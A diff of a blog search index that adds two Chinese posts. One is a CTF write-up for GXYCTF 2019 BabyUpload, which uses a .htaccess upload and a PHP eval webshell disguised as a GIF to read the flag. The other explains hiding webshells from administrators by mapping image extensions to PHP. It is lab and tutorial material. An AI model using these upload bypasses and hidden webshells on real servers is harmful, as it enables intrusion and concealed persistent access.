@@ -4,11 +4,30 @@
   
     
     <entry>
+      <title>GXYCTF:2019-BabyUpload</title>
+      <link href="2021/06/16/gxyctf-2019-babyupload/"/>
+      <url>2021/06/16/gxyctf-2019-babyupload/</url>
+      
+        <content type="html"><![CDATA[<p>apache</p><p>上传.htaccess</p><pre><code>&lt;FilesMatch "1"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><pre><code>Content-Type: image/jpeg</code></pre><pre><code>/var/www/html/upload/7f7b1f9e52adf7726727d061cd3fa94c/.htaccess succesfully uploaded!</code></pre><p>上传1.jpg</p><pre><code>GIF89a?&lt;script language="php"&gt;eval($_POST[1]);&lt;/script&gt;</code></pre><pre><code>/var/www/html/upload/7f7b1f9e52adf7726727d061cd3fa94c/1.jpg succesfully uploaded!</code></pre><p>蚁剑连接</p><p>d9db5681-3d2b-4655-b8f3-4bc989481944.node3.buuoj.cn/upload/7f7b1f9e52adf7726727d061cd3fa94c/1.jpg</p><p>虚拟终端cat /flag</p><p><img src="/2021/06/16/gxyctf-2019-babyupload/image-20210616215125367.png" alt="image-20210616215125367"></p><pre><code>flag{eda5bdce-0717-49c9-9fdf-e8289d3baed6}</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web:.htaccess文件上传后门</title>
       <link href="2021/06/16/web.htaccess-wen-jian-shang-chuan-hou-men/"/>
       <url>2021/06/16/web.htaccess-wen-jian-shang-chuan-hou-men/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>htaccess是Apache服务器中的一个配置文件，可以实现网页302重定向，自定义404页面，改变文件拓展名，允许/阻止特点的用户或者目录的访问，禁止目录列表，配置默认文档等功能。</p><p>在这个文件里面可以选择一定的后缀名以任意想要的格式进行解析，我们可以利用它进行隐藏后门。</p><p>比如说，我们有一个php的环境，然后我们最终也获得了它的webshell，但是我们的马后缀过于明显，在管理员定期的检查中，他们会着重注意脚本文件的检查，这时候就会被管理员发现。此时如果我们利用了.htaccess文件，我们就可以将马的后缀改成图片格式或者其他不容易被发觉的格式，然后让此格式以php的格式进行解析，这时候图片后缀（或者其它后缀）就相当于一个php脚本，这样子就可以躲避大部分的管理员的检查。</p><p>我们只需要将以下代码写入.htaccess文件中即可形成解析：</p><pre><code>&lt;FilesMatch "jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>此时，即可用菜刀对图片后缀的文件进行连接。</p>]]></content>
       
       
       
